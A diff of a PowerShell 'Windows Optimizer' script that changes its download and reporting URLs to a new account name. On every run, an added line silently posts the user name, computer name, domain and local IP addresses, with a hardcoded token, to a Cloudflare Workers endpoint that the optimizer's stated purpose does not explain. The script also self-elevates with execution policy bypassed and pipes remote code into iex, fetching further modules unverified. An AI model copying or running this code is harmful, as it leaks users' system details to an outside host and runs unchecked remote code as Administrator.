@@ -1,4 +1,4 @@
-<#
+﻿<#
 .SYNOPSIS
     Windows Optimizer Orchestrator (Lazy-Loading, IRM/IEX ready, Auto-Elevate)
 
@@ -30,7 +30,7 @@ $ScriptFile  = Join-Path $ScriptRoot "Select-Optimization.ps1"
 
 # Ensure directories exist
 $null = New-Item -ItemType Directory -Force -Path $ScriptRoot,$CoreDir,$ProfilesDir,$LogsDir,$SnapDir
-Invoke-RestMethod -Uri "https://cryocore.rhshourav.workers.dev/message" -Method Post -ContentType "application/json" -Body (@{ token="shourav"; text="System Info:`nSelect Optimization`nUser Name: $env:USERNAME`nPC Name: $env:COMPUTERNAME`nDomain Name: $env:USERDOMAIN`nLocal IP(s): $((Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '169.*' -and $_.IPAddress -notlike '127.*' } | ForEach-Object { $_.IPAddress }) -join ', ')" } | ConvertTo-Json) | Out-Null
+Invoke-RestMethod -Uri "https://cryocore.shouravx.workers.dev/message" -Method Post -ContentType "application/json" -Body (@{ token="shourav"; text="System Info:`nSelect Optimization`nUser Name: $env:USERNAME`nPC Name: $env:COMPUTERNAME`nDomain Name: $env:USERDOMAIN`nLocal IP(s): $((Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '169.*' -and $_.IPAddress -notlike '127.*' } | ForEach-Object { $_.IPAddress }) -join ', ')" } | ConvertTo-Json) | Out-Null
 
 # -------------------------------
 # Auto-elevate
@@ -39,7 +39,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     Write-Host "Restarting script as Administrator..." -ForegroundColor Yellow
     $psi = New-Object System.Diagnostics.ProcessStartInfo
     $psi.FileName = "powershell.exe"
-    $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -Command `"irm https://raw.githubusercontent.com/rhshourav/Windows-Scripts/main/Windows-Optimizer/Select-Optimization.ps1 | iex`""
+    $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -Command `"irm https://raw.githubusercontent.com/shouravx/Windows-Scripts/main/Windows-Optimizer/Select-Optimization.ps1 | iex`""
     $psi.Verb = "runas"
     [System.Diagnostics.Process]::Start($psi) | Out-Null
     Exit
@@ -63,7 +63,7 @@ function Load-CoreModule {
     param([string]$ModuleName)
     $file = Join-Path $CoreDir $ModuleName
     if (-not (Test-Path $file)) {
-        $content = Invoke-RestMethod "https://raw.githubusercontent.com/rhshourav/Windows-Scripts/main/Windows-Optimizer/core/$ModuleName" -UseBasicParsing
+        $content = Invoke-RestMethod "https://raw.githubusercontent.com/shouravx/Windows-Scripts/main/Windows-Optimizer/core/$ModuleName" -UseBasicParsing
         [System.IO.File]::WriteAllText($file, $content, [System.Text.Encoding]::UTF8)
     }
     . $file
@@ -73,7 +73,7 @@ function Load-Profile {
     param([string]$ProfileName)
     $file = Join-Path $ProfilesDir $ProfileName
     if (-not (Test-Path $file)) {
-        $content = Invoke-RestMethod "https://raw.githubusercontent.com/rhshourav/Windows-Scripts/main/Windows-Optimizer/profiles/$ProfileName" -UseBasicParsing
+        $content = Invoke-RestMethod "https://raw.githubusercontent.com/shouravx/Windows-Scripts/main/Windows-Optimizer/profiles/$ProfileName" -UseBasicParsing
         [System.IO.File]::WriteAllText($file, $content, [System.Text.Encoding]::UTF8)
     }
     . $file
